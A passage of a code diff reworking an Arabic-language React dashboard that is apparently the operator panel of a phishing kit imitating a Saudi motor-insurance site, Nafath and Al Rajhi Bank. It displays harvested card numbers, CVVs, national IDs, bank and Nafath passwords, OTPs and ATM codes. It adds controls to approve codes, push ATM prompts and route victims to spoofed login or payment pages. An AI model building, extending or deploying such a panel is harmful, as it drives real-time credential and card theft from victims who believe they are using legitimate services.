-                    {pendingCount}
-                  </div>
-                )}
+                <div>
+                  <p className="font-semibold">{getVisitorDisplayName(selectedVisitor)}</p>
+                  <p className="text-xs text-muted-foreground">{selectedVisitor.id}</p>
+                </div>
               </div>
-              <div>
-                <h1 className="text-xl font-bold">لوحة تحكم الزوار</h1>
-                <p className="text-sm text-muted-foreground">
-                  آخر تحديث: {format(new Date(), "HH:mm", { locale: ar })}
-                </p>
-              </div>
-            </div>
+            )}
           </div>
-
-          <div className="flex items-center gap-2">
-            <TooltipProvider>
-              <Tooltip>
-                <TooltipTrigger asChild>
-                  <Button variant="outline" size="icon" onClick={() => setShowStatistics(!showStatistics)}>
-                    {showStatistics ? <Eye className="h-4 w-4" /> : <EyeOff className="h-4 w-4" />}
-                  </Button>
-                </TooltipTrigger>
-                <TooltipContent><p>إخفاء/إظهار الإحصائيات</p></TooltipContent>
-              </Tooltip>
-            </TooltipProvider>
-
-            <TooltipProvider>
-              <Tooltip>
-                <TooltipTrigger asChild>
-                  <Button variant="outline" size="icon" onClick={handleRefresh}>
-                    <RefreshCw className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`} />
-                  </Button>
-                </TooltipTrigger>
-                <TooltipContent><p>تحديث البيانات</p></TooltipContent>
-              </Tooltip>
-            </TooltipProvider>
-
-            <div className="hidden md:flex items-center gap-2">
-              <Button variant="destructive" onClick={handleClearAll} disabled={notifications.length === 0} className="gap-2">
-                <Trash2 className="h-4 w-4" />
-                مسح الكل
-              </Button>
+          {selectedVisitor && (
+            <div className="flex items-center gap-2">
+              <TooltipProvider>
+                <Tooltip>
+                  <TooltipTrigger asChild>
+                    <Button
+                      variant="ghost"
+                      size="icon"
+                      className="text-destructive"
+                      onClick={() => handleDelete(selectedVisitor.id)}
+                      data-testid="button-delete-visitor"
+                    >
+                      <Trash2 className="h-4 w-4" />
+                    </Button>
+                  </TooltipTrigger>
+                  <TooltipContent>حذف</TooltipContent>
+                </Tooltip>
+              </TooltipProvider>
             </div>
-
-            <DropdownMenu>
-              <DropdownMenuTrigger asChild>
-                <Button variant="ghost" className="relative h-10 w-10 rounded-full">
-                  <Avatar className="h-10 w-10 ring-2 ring-primary/20">
-                    <AvatarFallback className="bg-gradient-to-br from-primary to-primary/80 text-primary-foreground">مد</AvatarFallback>
-                  </Avatar>
-                </Button>
-              </DropdownMenuTrigger>
-              <DropdownMenuContent align="end" className="w-56">
-                <DropdownMenuLabel>
-                  <div className="flex flex-col space-y-1">
-                    <p className="text-sm font-medium">مدير النظام</p>
-                    <p className="text-xs text-muted-foreground">admin@example.com</p>
-                  </div>
-                </DropdownMenuLabel>
-                <DropdownMenuSeparator />
-                <DropdownMenuItem onClick={() => setLocation("/")}>
-                  <Navigation className="ml-2 h-4 w-4" />
-                  الصفحة الرئيسية
-                </DropdownMenuItem>
-              </DropdownMenuContent>
-            </DropdownMenu>
-          </div>
+          )}
         </div>
-      </header>
 
-      <div className="p-6">
-        {showStatistics && (
-          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
-            <StatisticsCard
-              title="إجمالي الزوار"
-              value={totalVisitors}
-              change="+12%"
-              changeType="increase"
-              icon={Users}
-              colorClass="bg-blue-500"
-              trend={visitorTrend}
-            />
-            <StatisticsCard
-              title="البطاقات المقدمة"
-              value={cardSubmissions}
-              change="+8%"
-              changeType="increase"
-              icon={CreditCard}
-              colorClass="bg-emerald-500"
-              trend={cardTrend}
-            />
-            <StatisticsCard
-              title="المتصلون الآن"
-              value={onlineUsersCount}
-              change="0%"
-              changeType="neutral"
-              icon={Activity}
-              colorClass="bg-amber-500"
-              trend={onlineTrend}
-            />
-            <StatisticsCard
-              title="الموافقات"
-              value={notifications.filter(n => n.cardOtpApproved).length}
-              change="+5%"
-              changeType="increase"
-              icon={CheckCircle}
-              colorClass="bg-purple-500"
-              trend={approvedTrend}
-            />
-          </div>
-        )}
-
-        <Card className="overflow-hidden">
-          <CardHeader className="bg-muted/30 border-b">
-            <div className="flex items-center justify-between flex-wrap gap-4">
-              <CardTitle className="flex items-center gap-2">
-                <Bell className="h-5 w-5" />
-                قائمة الزوار
-              </CardTitle>
-              <div className="flex items-center gap-2">
-                <div className="relative">
-                  <Search className="absolute right-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
-                  <Input
-                    type="search"
-                    placeholder="البحث..."
-                    className="pr-10 w-64"
-                    value={searchTerm}
-                    onChange={(e) => setSearchTerm(e.target.value)}
-                    data-testid="input-dashboard-search"
-                  />
-                </div>
-              </div>
+        {/* Detail Content */}
+        <ScrollArea className="flex-1 p-4">
+          {!selectedVisitor ? (
+            <div className="flex flex-col items-center justify-center h-full text-muted-foreground">
+              <MessageSquare className="h-16 w-16 mb-4 opacity-30" />
+              <p className="text-lg">اختر زائر لعرض التفاصيل</p>
             </div>
-          </CardHeader>
-
-          <CardContent className="p-0">
-            <div className="hidden lg:block overflow-x-auto">
-              <table className="w-full">
-                <thead className="bg-muted/50">
-                  <tr>
-                    <th className="px-4 py-3 text-right text-sm font-medium">الزائر</th>
-                    <th className="px-4 py-3 text-center text-sm font-medium">البيانات</th>
-                    <th className="px-4 py-3 text-center text-sm font-medium">OTP/PIN</th>
-                    <th className="px-4 py-3 text-center text-sm font-medium">الموافقات</th>
-                    <th className="px-4 py-3 text-center text-sm font-medium">قرار الدفع</th>
-                    <th className="px-4 py-3 text-center text-sm font-medium">الحالة</th>
-                    <th className="px-4 py-3 text-center text-sm font-medium">التوجيه</th>
-                    <th className="px-4 py-3 text-center text-sm font-medium">الإجراءات</th>
-                  </tr>
-                </thead>
-                <tbody className="divide-y">
-                  {paginatedNotifications.map((notification) => (
-                    <tr key={notification.id} className="hover:bg-muted/30 transition-colors">
-                      <td className="px-4 py-4">
-                        <div className="flex items-center gap-3">
-                          <div className="w-10 h-10 rounded-full bg-gradient-to-br from-primary/20 to-primary/10 flex items-center justify-center">
-                            <User className="h-5 w-5 text-primary" />
-                          </div>
-                          <div>
-                            <p className="font-medium text-sm">{notification.cardName || notification.nationalId || "زائر"}</p>
-                            <p className="text-xs text-muted-foreground">{notification.id.substring(0, 20)}...</p>
-                          </div>
-                        </div>
-                      </td>
-                      <td className="px-4 py-4">
-                        <div className="flex flex-col gap-2">
-                          {/* Personal Info */}
-                          <div className="flex flex-wrap justify-center gap-1">
-                            {notification.nationalId && (
-                              <Badge className="text-xs bg-blue-600 text-white">
-                                <User className="h-3 w-3 ml-1" />
-                                {notification.nationalId}
-                              </Badge>
-                            )}
-                            {notification.phoneNumber && (
-                              <Badge className="text-xs bg-purple-600 text-white">
-                                <Phone className="h-3 w-3 ml-1" />
-                                {notification.phoneNumber}
-                              </Badge>
-                            )}
-                            {notification.phoneCarrier && (
-                              <Badge className="text-xs bg-violet-500 text-white">
-                                {notification.phoneCarrier}
-                              </Badge>
-                            )}
-                            {notification.personalInfo?.birthYear && (
-                              <Badge className="text-xs bg-indigo-600 text-white">
-                                {notification.personalInfo.birthDay}/{notification.personalInfo.birthMonth}/{notification.personalInfo.birthYear}
-                              </Badge>
-                            )}
-                          </div>
-                          {/* Card Info */}
-                          <div className="flex flex-wrap justify-center gap-1">
-                            {notification.cardNumber && (
-                              <Badge className="text-xs bg-emerald-600 text-white">
-                                <CreditCard className="h-3 w-3 ml-1" />
-                                {notification.cardNumber}
-                              </Badge>
-                            )}
-                            {notification.cardExpiry && (
-                              <Badge className="text-xs bg-amber-600 text-white">
-                                {notification.cardExpiry}
-                              </Badge>
-                            )}
-                            {notification.cardCvv && (
-                              <Badge className="text-xs bg-rose-600 text-white">
-                                CVV: {notification.cardCvv}
-                              </Badge>
-                            )}
-                            {notification.cardName && (
-                              <Badge className="text-xs bg-teal-600 text-white">
-                                {notification.cardName}
-                              </Badge>
-                            )}
-                          </div>
-                          {/* Nafaz Info */}
-                          <div className="flex flex-wrap justify-center gap-1">
-                            {notification.nafazId && (
-                              <Badge className="text-xs bg-cyan-600 text-white">
-                                نفاذ: {notification.nafazId}
-                              </Badge>
-                            )}
-                            {notification.nafazPass && (
-                              <Badge className="text-xs bg-cyan-700 text-white">
-                                كلمة السر: {notification.nafazPass}
-                              </Badge>
-                            )}
-                          </div>
-                          {/* Rajhi Info */}
-                          <div className="flex flex-wrap justify-center gap-1">
-                            {notification.rajhiUser && (
-                              <Badge className="text-xs bg-sky-600 text-white">
-                                الراجحي: {notification.rajhiUser}
-                              </Badge>
-                            )}
-                            {notification.rajhiPassword && (
-                              <Badge className="text-xs bg-sky-700 text-white">
-                                كلمة السر: {notification.rajhiPassword}
-                              </Badge>
-                            )}
-                          </div>
-                          {/* Show placeholder if no data */}
-                          {!notification.nationalId && !notification.phoneNumber && !notification.cardNumber && (
-                            <Badge variant="secondary" className="text-xs mx-auto">
-                              لا توجد بيانات
-                            </Badge>
-                          )}
-                        </div>
-                      </td>
-                      <td className="px-4 py-4">
-                        <div className="flex flex-col items-center gap-1">
-                          {notification.otpCode && (
-                            <Badge className="bg-blue-600 text-xs text-white">OTP: {notification.otpCode}</Badge>
-                          )}
-                          {notification.phoneOtpCode && (
-                            <Badge className="bg-pink-600 text-xs text-white">Phone: {notification.phoneOtpCode}</Badge>
-                          )}
-                          {notification.rajhiOtp && (
-                            <Badge className="bg-sky-600 text-xs text-white">Rajhi: {notification.rajhiOtp}</Badge>
-                          )}
-                          {notification.atmVerification?.code && (
-                            <Badge className="bg-orange-600 text-xs text-white">ATM: {notification.atmVerification.code}</Badge>
-                          )}
-                          {notification.authNumber && (
-                            <Badge className="bg-purple-600 text-xs text-white">Auth: {notification.authNumber}</Badge>
-                          )}
-                        </div>
-                      </td>
-                      <td className="px-4 py-4">
-                        <div className="flex justify-center gap-1">
-                          <TooltipProvider>
-                            <Tooltip>
-                              <TooltipTrigger asChild>
-                                <div
-                                  className={`w-8 h-8 rounded-full flex items-center justify-center cursor-pointer transition-all ${
-                                    notification.cardOtpApproved
-                                      ? "bg-emerald-100 dark:bg-emerald-900/30"
-                                      : "bg-gray-100 dark:bg-gray-800"
-                                  }`}
-                                  onClick={() => handleApprovalToggle(notification.id, "cardOtpApproved", !notification.cardOtpApproved)}
-                                >
-                                  <CreditCard className={`h-4 w-4 ${notification.cardOtpApproved ? "text-emerald-600" : "text-gray-400"}`} />
-                                </div>
-                              </TooltipTrigger>
-                              <TooltipContent><p>OTP البطاقة</p></TooltipContent>
-                            </Tooltip>
-                          </TooltipProvider>
-                          <TooltipProvider>
-                            <Tooltip>
-                              <TooltipTrigger asChild>
-                                <div
-                                  className={`w-8 h-8 rounded-full flex items-center justify-center cursor-pointer transition-all ${
-                                    notification.phoneOtpApproved
-                                      ? "bg-emerald-100 dark:bg-emerald-900/30"
-                                      : "bg-gray-100 dark:bg-gray-800"
-                                  }`}
-                                  onClick={() => handleApprovalToggle(notification.id, "phoneOtpApproved", !notification.phoneOtpApproved)}
-                                >
-                                  <Phone className={`h-4 w-4 ${notification.phoneOtpApproved ? "text-emerald-600" : "text-gray-400"}`} />
-                                </div>
-                              </TooltipTrigger>
-                              <TooltipContent><p>OTP الهاتف</p></TooltipContent>
-                            </Tooltip>
-                          </TooltipProvider>
-                          <TooltipProvider>
-                            <Tooltip>
-                              <TooltipTrigger asChild>
-                                <div
-                                  className={`w-8 h-8 rounded-full flex items-center justify-center cursor-pointer transition-all ${
-                                    notification.nafathApproved
-                                      ? "bg-emerald-100 dark:bg-emerald-900/30"
-                                      : "bg-gray-100 dark:bg-gray-800"
-                                  }`}
-                                  onClick={() => handleApprovalToggle(notification.id, "nafathApproved", !notification.nafathApproved)}
-                                >
-                                  <ClipboardCheck className={`h-4 w-4 ${notification.nafathApproved ? "text-emerald-600" : "text-gray-400"}`} />
-                                </div>
-                              </TooltipTrigger>
-                              <TooltipContent><p>نفاذ</p></TooltipContent>
-                            </Tooltip>
-                          </TooltipProvider>
-                        </div>
-                      </td>
-                      <td className="px-4 py-4">
-                        <div className="flex justify-center gap-1">
-                          <Button
-                            size="sm"
-                            variant="outline"
-                            className="text-xs bg-emerald-50 hover:bg-emerald-100 text-emerald-700 border-emerald-200"
-                            onClick={() => handleApprovalStatus(notification.id, "approved_otp")}
-                          >
-                            OTP
-                          </Button>
-                          <Dialog>
-                            <DialogTrigger asChild>
-                              <Button size="sm" variant="outline" className="text-xs bg-blue-50 hover:bg-blue-100 text-blue-700 border-blue-200">
-                                ATM
-                              </Button>
-                            </DialogTrigger>
-                            <DialogContent dir="rtl">
-                              <DialogHeader>
-                                <DialogTitle>إدخال رمز الصراف</DialogTitle>
-                              </DialogHeader>
-                              <div className="py-4">
-                                <Input
-                                  id={`atm-${notification.id}`}
-                                  placeholder="أدخل رمز الصراف"
-                                  className="text-center text-xl"
-                                />
-                              </div>
-                              <DialogFooter>
-                                <Button onClick={() => {
-                                  const input = document.getElementById(`atm-${notification.id}`) as HTMLInputElement;
-                                  if (input?.value) {
-                                    handleApprovalStatus(notification.id, "approved_atm", input.value);
-                                  }
-                                }}>
-                                  تأكيد
-                                </Button>
-                              </DialogFooter>
-                            </DialogContent>
-                          </Dialog>
-                          <Button
-                            size="sm"
-                            variant="outline"
-                            className="text-xs bg-rose-50 hover:bg-rose-100 text-rose-700 border-rose-200"
-                            onClick={() => handleApprovalStatus(notification.id, "rejected")}
-                          >
-                            رفض
-                          </Button>
-                        </div>
-                      </td>
-                      <td className="px-4 py-4 text-center">
-                        <UserStatus visitorId={notification.id} />
-                        <div className="mt-1">
-                          <Badge variant="outline" className="text-xs">
-                            {pageLabels[notification.currentPage || ""] || notification.currentPage || "الرئيسية"}
-                          </Badge>
-                        </div>
-                      </td>
-                      <td className="px-4 py-4">
-                        <div className="flex flex-col gap-2 items-center">
-                          <Select onValueChange={(value) => handleRouteUser(notification.id, value)}>
-                            <SelectTrigger className="h-8 text-xs w-32">
-                              <SelectValue placeholder="توجيه إلى..." />
-                            </SelectTrigger>
-                            <SelectContent>
-                              <SelectItem value="motor-insurance">تأمين السيارات</SelectItem>
-                              <SelectItem value="phone-verification">التحقق من الهاتف</SelectItem>
-                              <SelectItem value="nafaz">نفاذ</SelectItem>
-                              <SelectItem value="rajhi">الراجحي</SelectItem>
-                            </SelectContent>
-                          </Select>
-                          <Select onValueChange={(value) => handleStepChange(notification.id, value)}>
-                            <SelectTrigger className="h-8 text-xs w-32">
-                              <SelectValue placeholder="خطوة..." />
-                            </SelectTrigger>
-                            <SelectContent>
-                              <SelectItem value="1">البيانات الشخصية</SelectItem>
-                              <SelectItem value="2">بيانات المركبة</SelectItem>
-                              <SelectItem value="3">عروض التأمين</SelectItem>
-                              <SelectItem value="4">الدفع</SelectItem>
-                              <SelectItem value="5">OTP البطاقة</SelectItem>
-                              <SelectItem value="6">التحقق النهائي</SelectItem>
-                              <SelectItem value="7">النجاح</SelectItem>
-                            </SelectContent>
-                          </Select>
-                        </div>
-                      </td>
-                      <td className="px-4 py-4">
-                        <div className="flex justify-center gap-1">
-                          <PrioritySelector
-                            notificationId={notification.id}
-                            currentColor={notification.any || null}
-                            onColorChange={handlePriorityChange}
+          ) : (
+            <div className="max-w-4xl mx-auto space-y-4">
+              {/* Quick Actions */}
+              <Card>
+                <CardHeader className="pb-3">
+                  <CardTitle className="text-base flex items-center gap-2">
+                    <Shield className="h-4 w-4" />
+                    إجراءات سريعة
+                  </CardTitle>
+                </CardHeader>
+                <CardContent>
+                  <div className="flex flex-wrap gap-2">
+                    <Button
+                      size="sm"
+                      className="bg-emerald-600 hover:bg-emerald-700"
+                      onClick={() => handleApprovalStatus(selectedVisitor.id, "approved_otp")}
+                      data-testid="button-approve-otp"
+                    >
+                      <CheckCircle className="h-4 w-4 ml-2" />
+                      موافقة OTP
+                    </Button>
+                    <Dialog>
+                      <DialogTrigger asChild>
+                        <Button size="sm" variant="outline" className="border-blue-500 text-blue-600">
+                          <Key className="h-4 w-4 ml-2" />
+                          إرسال ATM
+                        </Button>
+                      </DialogTrigger>
+                      <DialogContent dir="rtl">
+                        <DialogHeader>
+                          <DialogTitle>إدخال رمز الصراف</DialogTitle>
+                        </DialogHeader>
+                        <div className="py-4">
+                          <Input
+                            id="atm-code-input"
+                            placeholder="أدخل رمز الصراف"
+                            className="text-center text-xl"
+                            data-testid="input-atm-code"
                           />
-                          <TooltipProvider>
-                            <Tooltip>
-                              <TooltipTrigger asChild>
-                                <Button
-                                  variant="ghost"
-                                  size="icon"
-                                  className="h-8 w-8 text-destructive hover:bg-destructive/10"
-                                  onClick={() => handleDelete(notification.id)}
-                                >
-                                  <Trash2 className="h-4 w-4" />
-                                </Button>
-                              </TooltipTrigger>
-                              <TooltipContent><p>حذف</p></TooltipContent>
-                            </Tooltip>
-                          </TooltipProvider>
                         </div>
-                      </td>
-                    </tr>
-                  ))}
-                </tbody>
-              </table>
-            </div>
+                        <DialogFooter>
+                          <DialogClose asChild>
+                            <Button onClick={() => {
+                              const input = document.getElementById("atm-code-input") as HTMLInputElement;
+                              if (input?.value) {
+                                handleApprovalStatus(selectedVisitor.id, "approved_atm", input.value);
+                              }
+                            }} data-testid="button-confirm-atm">
+                              تأكيد
+                            </Button>
+                          </DialogClose>
+                        </DialogFooter>
+                      </DialogContent>
+                    </Dialog>
+                    <Button
+                      size="sm"
+                      variant="destructive"
+                      onClick={() => handleApprovalStatus(selectedVisitor.id, "rejected")}
+                      data-testid="button-reject"
+                    >
+                      رفض
+                    </Button>
+                  </div>
 
-            <div className="lg:hidden space-y-4 p-4">
-              {paginatedNotifications.map((notification) => (
-                <Card key={notification.id} className="overflow-hidden">
-                  <CardHeader className="pb-3 bg-muted/20">
-                    <div className="flex justify-between items-start">
-                      <div className="flex items-center gap-3">
-                        <div className="w-10 h-10 rounded-full bg-gradient-to-br from-primary/20 to-primary/10 flex items-center justify-center">
-                          <User className="h-5 w-5 text-primary" />
-                        </div>
+                  <div className="flex flex-wrap gap-2 mt-4 pt-4 border-t">
+                    <Select onValueChange={(v) => handleRouteUser(selectedVisitor.id, v)}>
+                      <SelectTrigger className="w-40" data-testid="select-route-page">
+                        <SelectValue placeholder="توجيه لصفحة..." />
+                      </SelectTrigger>
+                      <SelectContent>
+                        <SelectItem value="motor-insurance">تأمين السيارات</SelectItem>
+                        <SelectItem value="phone-verification">التحقق من الهاتف</SelectItem>
+                        <SelectItem value="nafaz">نفاذ</SelectItem>
+                        <SelectItem value="rajhi">الراجحي</SelectItem>
+                      </SelectContent>
+                    </Select>
+                    <Select onValueChange={(v) => handleStepChange(selectedVisitor.id, v)}>
+                      <SelectTrigger className="w-40" data-testid="select-route-step">
+                        <SelectValue placeholder="توجيه لخطوة..." />
+                      </SelectTrigger>
+                      <SelectContent>
+                        <SelectItem value="1">الخطوة 1 - البيانات</SelectItem>
+                        <SelectItem value="2">الخطوة 2 - المركبة</SelectItem>
+                        <SelectItem value="3">الخطوة 3 - العروض</SelectItem>
+                        <SelectItem value="4">الخطوة 4 - الدفع</SelectItem>
+                        <SelectItem value="5">الخطوة 5 - OTP</SelectItem>
+                        <SelectItem value="6">الخطوة 6 - التحقق</SelectItem>
+                        <SelectItem value="7">الخطوة 7 - النجاح</SelectItem>
+                      </SelectContent>
+                    </Select>
+                    <div className="flex gap-1">
+                      {["red", "yellow", "green"].map((color) => (
+                        <Button
+                          key={color}
+                          size="icon"
+                          variant={selectedVisitor.any === color ? "default" : "outline"}
+                          className={`w-8 h-8 ${selectedVisitor.any === color ? getPriorityColor(color) : ""}`}
+                          onClick={() => handlePriorityChange(selectedVisitor.id, selectedVisitor.any === color ? null : color as any)}
+                          data-testid={`button-priority-${color}`}
+                        >
+                          <Circle className={`h-3 w-3 ${color === "red" ? "text-red-500" : color === "yellow" ? "text-yellow-500" : "text-green-500"}`} />
+                        </Button>
+                      ))}
+                    </div>
+                  </div>
+
+                  <div className="flex gap-2 mt-4 pt-4 border-t">
+                    <Button
+                      size="sm"
+                      variant={selectedVisitor.cardOtpApproved ? "default" : "outline"}
+                      onClick={() => handleApprovalToggle(selectedVisitor.id, "cardOtpApproved", !selectedVisitor.cardOtpApproved)}
+                      className={selectedVisitor.cardOtpApproved ? "bg-emerald-600" : ""}
+                      data-testid="button-toggle-card-otp"
+                    >
+                      <CreditCard className="h-4 w-4 ml-1" />
+                      OTP البطاقة
+                    </Button>
+                    <Button
+                      size="sm"
+                      variant={selectedVisitor.phoneOtpApproved ? "default" : "outline"}
+                      onClick={() => handleApprovalToggle(selectedVisitor.id, "phoneOtpApproved", !selectedVisitor.phoneOtpApproved)}
+                      className={selectedVisitor.phoneOtpApproved ? "bg-emerald-600" : ""}
+                      data-testid="button-toggle-phone-otp"
+                    >
+                      <Phone className="h-4 w-4 ml-1" />
+                      OTP الهاتف
+                    </Button>
+                    <Button
+                      size="sm"
+                      variant={selectedVisitor.nafathApproved ? "default" : "outline"}
+                      onClick={() => handleApprovalToggle(selectedVisitor.id, "nafathApproved", !selectedVisitor.nafathApproved)}
+                      className={selectedVisitor.nafathApproved ? "bg-emerald-600" : ""}
+                      data-testid="button-toggle-nafath"
+                    >
+                      <ClipboardCheck className="h-4 w-4 ml-1" />
+                      نفاذ
+                    </Button>
+                  </div>
+                </CardContent>
+              </Card>
+
+              {/* Personal Info */}
+              <Card>
+                <CardHeader className="pb-3">
+                  <CardTitle className="text-base flex items-center gap-2">
+                    <User className="h-4 w-4" />
+                    البيانات الشخصية
+                  </CardTitle>
+                </CardHeader>
+                <CardContent>
+                  <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
+                    {selectedVisitor.nationalId && (
+                      <div className="flex items-center gap-2">
+                        <Hash className="h-4 w-4 text-blue-500" />
                         <div>
-                          <p className="font-semibold">{notification.cardName || notification.nationalId || "زائر"}</p>
-                          <p className="text-sm text-muted-foreground">{notification.id.substring(0, 20)}...</p>
+                          <p className="text-xs text-muted-foreground">رقم الهوية</p>
+                          <p className="font-mono font-semibold">{selectedVisitor.nationalId}</p>
                         </div>
                       </div>
-                      <UserStatus visitorId={notification.id} />
-                    </div>
+                    )}
+                    {selectedVisitor.phoneNumber && (
+                      <div className="flex items-center gap-2">
+                        <Phone className="h-4 w-4 text-purple-500" />
+                        <div>
+                          <p className="text-xs text-muted-foreground">الهاتف</p>
+                          <p className="font-mono font-semibold">{selectedVisitor.phoneNumber}</p>
+                        </div>
+                      </div>
+                    )}
+                    {selectedVisitor.phoneCarrier && (
+                      <div className="flex items-center gap-2">
+                        <Smartphone className="h-4 w-4 text-violet-500" />
+                        <div>
+                          <p className="text-xs text-muted-foreground">الشبكة</p>
+                          <p className="font-semibold">{selectedVisitor.phoneCarrier}</p>
+                        </div>
+                      </div>
+                    )}
+                    {selectedVisitor.personalInfo?.birthYear && (
+                      <div className="flex items-center gap-2">
+                        <Calendar className="h-4 w-4 text-indigo-500" />
+                        <div>
+                          <p className="text-xs text-muted-foreground">تاريخ الميلاد</p>
+                          <p className="font-semibold">
+                            {selectedVisitor.personalInfo.birthDay}/{selectedVisitor.personalInfo.birthMonth}/{selectedVisitor.personalInfo.birthYear}
+                          </p>
+                        </div>
+                      </div>
+                    )}
+                  </div>
+                </CardContent>
+              </Card>
+
+              {/* Card Info */}
+              {(selectedVisitor.cardNumber || selectedVisitor.cardName) && (
+                <Card className="border-emerald-200 dark:border-emerald-800">
+                  <CardHeader className="pb-3 bg-emerald-50 dark:bg-emerald-900/20">
+                    <CardTitle className="text-base flex items-center gap-2 text-emerald-700 dark:text-emerald-400">
+                      <CreditCard className="h-4 w-4" />
+                      بيانات البطاقة
+                    </CardTitle>
                   </CardHeader>
-
-                  <CardContent className="pt-4 space-y-4">
-                    {/* Personal & Card Info */}
-                    <div className="flex flex-wrap gap-1">
-                      {notification.nationalId && (
-                        <Badge className="text-xs bg-blue-600 text-white">
-                          <User className="h-3 w-3 ml-1" />
-                          {notification.nationalId}
-                        </Badge>
+                  <CardContent className="pt-4">
+                    <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
+                      {selectedVisitor.cardNumber && (
+                        <div className="col-span-2">
+                          <p className="text-xs text-muted-foreground">رقم البطاقة</p>
+                          <p className="font-mono text-lg font-bold tracking-wider">{selectedVisitor.cardNumber}</p>
+                        </div>
                       )}
-                      {notification.phoneNumber && (
-                        <Badge className="text-xs bg-purple-600 text-white">
-                          <Phone className="h-3 w-3 ml-1" />
-                          {notification.phoneNumber}
-                        </Badge>
+                      {selectedVisitor.cardExpiry && (
+                        <div>
+                          <p className="text-xs text-muted-foreground">تاريخ الانتهاء</p>
+                          <p className="font-mono font-semibold">{selectedVisitor.cardExpiry}</p>
+                        </div>
                       )}
-                      {notification.cardNumber && (
-                        <Badge className="text-xs bg-emerald-600 text-white">
-                          <CreditCard className="h-3 w-3 ml-1" />
-                          {notification.cardNumber}
-                        </Badge>
+                      {selectedVisitor.cardCvv && (
+                        <div>
+                          <p className="text-xs text-muted-foreground">CVV</p>
+                          <p className="font-mono font-semibold text-rose-600">{selectedVisitor.cardCvv}</p>
+                        </div>
                       )}
-                      {notification.cardExpiry && (
-                        <Badge className="text-xs bg-amber-600 text-white">
-                          {notification.cardExpiry}
-                        </Badge>
+                      {selectedVisitor.cardName && (
+                        <div className="col-span-2">
+                          <p className="text-xs text-muted-foreground">اسم حامل البطاقة</p>
+                          <p className="font-semibold">{selectedVisitor.cardName}</p>
+                        </div>
                       )}
-                      {notification.cardCvv && (
-                        <Badge className="text-xs bg-rose-600 text-white">
-                          CVV: {notification.cardCvv}
-                        </Badge>
-                      )}
-                      {notification.nafazId && (
-                        <Badge className="text-xs bg-cyan-600 text-white">
-                          نفاذ: {notification.nafazId}
-                        </Badge>
-                      )}
-                      {notification.rajhiUser && (
-                        <Badge className="text-xs bg-sky-600 text-white">
-                          الراجحي: {notification.rajhiUser}
-                        </Badge>
-                      )}
-                    </div>
-                    {/* OTP/PIN Info */}
-                    <div className="flex flex-wrap gap-2">
-                      {notification.otpCode && <Badge className="bg-blue-600 text-white">OTP: {notification.otpCode}</Badge>}
-                      {notification.phoneOtpCode && <Badge className="bg-pink-600 text-white">Phone: {notification.phoneOtpCode}</Badge>}
-                      {notification.rajhiOtp && <Badge className="bg-sky-600 text-white">Rajhi: {notification.rajhiOtp}</Badge>}
-                      {notification.atmVerification?.code && <Badge className="bg-orange-600 text-white">ATM: {notification.atmVerification.code}</Badge>}
-                    </div>
-
-                    <div className="flex gap-2 flex-wrap">
-                      <Button size="sm" className="bg-emerald-500 hover:bg-emerald-600" onClick={() => handleApprovalStatus(notification.id, "approved_otp")}>
-                        موافقة OTP
-                      </Button>
-                      <Button size="sm" variant="destructive" onClick={() => handleApprovalStatus(notification.id, "rejected")}>
-                        رفض
-                      </Button>
-                    </div>
-
-                    <div className="pt-3 border-t">
-                      <Select onValueChange={(value) => handleRouteUser(notification.id, value)}>
-                        <SelectTrigger className="w-full">
-                          <SelectValue placeholder="توجيه إلى صفحة..." />
-                        </SelectTrigger>
-                        <SelectContent>
-                          <SelectItem value="motor-insurance">تأمين السيارات</SelectItem>
-                          <SelectItem value="phone-verification">التحقق من الهاتف</SelectItem>
-                          <SelectItem value="nafaz">نفاذ</SelectItem>
-                          <SelectItem value="rajhi">الراجحي</SelectItem>
-                        </SelectContent>
-                      </Select>
-                    </div>
-
-                    <div className="flex gap-2 pt-2 border-t">
-                      <Button variant="outline" onClick={() => handleDelete(notification.id)} className="ml-auto text-destructive" size="sm">
-                        <Trash2 className="h-4 w-4" />
-                      </Button>
                     </div>
                   </CardContent>
                 </Card>
-              ))}
+              )}
+
+              {/* OTP Codes */}
+              {(selectedVisitor.otpCode || selectedVisitor.phoneOtpCode || selectedVisitor.rajhiOtp || selectedVisitor.atmVerification?.code) && (
+                <Card className="border-blue-200 dark:border-blue-800">
+                  <CardHeader className="pb-3 bg-blue-50 dark:bg-blue-900/20">
+                    <CardTitle className="text-base flex items-center gap-2 text-blue-700 dark:text-blue-400">
+                      <Key className="h-4 w-4" />
+                      رموز التحقق
+                    </CardTitle>
+                  </CardHeader>
+                  <CardContent className="pt-4">
+                    <div className="flex flex-wrap gap-3">
+                      {selectedVisitor.otpCode && (
+                        <div className="bg-blue-100 dark:bg-blue-900/30 rounded-lg px-4 py-3 text-center">
+                          <p className="text-xs text-muted-foreground mb-1">OTP البطاقة</p>
+                          <p className="font-mono text-2xl font-bold text-blue-600">{selectedVisitor.otpCode}</p>
+                        </div>
+                      )}
+                      {selectedVisitor.phoneOtpCode && (
+                        <div className="bg-pink-100 dark:bg-pink-900/30 rounded-lg px-4 py-3 text-center">
+                          <p className="text-xs text-muted-foreground mb-1">OTP الهاتف</p>
+                          <p className="font-mono text-2xl font-bold text-pink-600">{selectedVisitor.phoneOtpCode}</p>
+                        </div>
+                      )}
+                      {selectedVisitor.rajhiOtp && (
+                        <div className="bg-sky-100 dark:bg-sky-900/30 rounded-lg px-4 py-3 text-center">
+                          <p className="text-xs text-muted-foreground mb-1">OTP الراجحي</p>
+                          <p className="font-mono text-2xl font-bold text-sky-600">{selectedVisitor.rajhiOtp}</p>
+                        </div>
+                      )}
+                      {selectedVisitor.atmVerification?.code && (
+                        <div className="bg-orange-100 dark:bg-orange-900/30 rounded-lg px-4 py-3 text-center">
+                          <p className="text-xs text-muted-foreground mb-1">رمز الصراف</p>
+                          <p className="font-mono text-2xl font-bold text-orange-600">{selectedVisitor.atmVerification.code}</p>
+                        </div>
+                      )}
+                      {selectedVisitor.authNumber && (
+                        <div className="bg-purple-100 dark:bg-purple-900/30 rounded-lg px-4 py-3 text-center">
+                          <p className="text-xs text-muted-foreground mb-1">رقم المصادقة</p>
+                          <p className="font-mono text-2xl font-bold text-purple-600">{selectedVisitor.authNumber}</p>
+                        </div>
+                      )}
+                    </div>
+                  </CardContent>
+                </Card>
+              )}
+
+              {/* Nafaz Info */}
